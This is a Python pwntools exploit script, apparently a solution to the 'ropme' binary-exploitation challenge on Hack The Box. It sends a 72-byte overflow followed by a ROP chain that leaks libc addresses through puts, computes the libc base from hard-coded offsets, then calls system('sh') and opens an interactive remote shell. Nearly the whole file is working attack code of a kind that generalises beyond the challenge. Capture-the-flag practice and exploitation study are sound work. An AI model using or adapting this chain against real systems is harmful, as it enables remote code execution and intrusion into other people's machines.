#!/usr/bin/python

'''
    ropme
    @Author: Lorenzo Invidia
    @Requirements: pwntools
'''

# Find libc version
# https://libc.blukat.me/?q=puts%3A690%2Cfgets%3Aad0

import os
from pwn import *

host = 'docker.hackthebox.eu'
port = 30255

e = ELF('./ropme', checksec=False)

#r = process(e.path)
r = remote(host, port)

context(os="linux", arch="amd64")
#context.log_level = 'DEBUG'

junk = 'A'*72                           # offset
gg1 = 0x4006d3                          # pop rdi ; ret
puts = e.symbols['puts']                # puts
fgets_got = e.got['fgets']              # fgets
puts_got = e.got['puts']                # puts ptr in got
main = e.symbols['main']                # main
sh = 0x40038f                           # sh from 'flush'
puts_off = 0x06f690                     # libc.so puts offset
system_off = 0x045390                   # libc.so system offset

def leak(addr):
    payload = junk
    payload += p64(gg1)                 # pop rdi;ret
    payload += p64(addr)                # address to print
    payload += p64(puts)                # call puts
    payload += p64(main)                # loop to main
    r.recvuntil('dah?\n')
    r.sendline(payload)
    return u64(r.recvline().strip().ljust(8, "\x00"))

def pwn(addr):
    payload = junk
    payload += p64(gg1)                 # pop rdi;ret
    payload += p64(sh)                  # sh
    payload += p64(addr)                # call addr
    r.sendline(payload)

# Stage 1
libc_puts = leak(puts_got)
libc_fgets = leak(fgets_got)
r.recvuntil('dah?\n')
libc_base = libc_puts - puts_off
log.success("leaked libc puts: " + format(hex(libc_puts)))
log.success("leaked libc fgets: " + format(hex(libc_fgets)))
log.success("leaked libc base: " + format(hex(libc_base)))
libc_system = libc_base + system_off

# Stage 2
pwn(libc_system)
r.interactive()
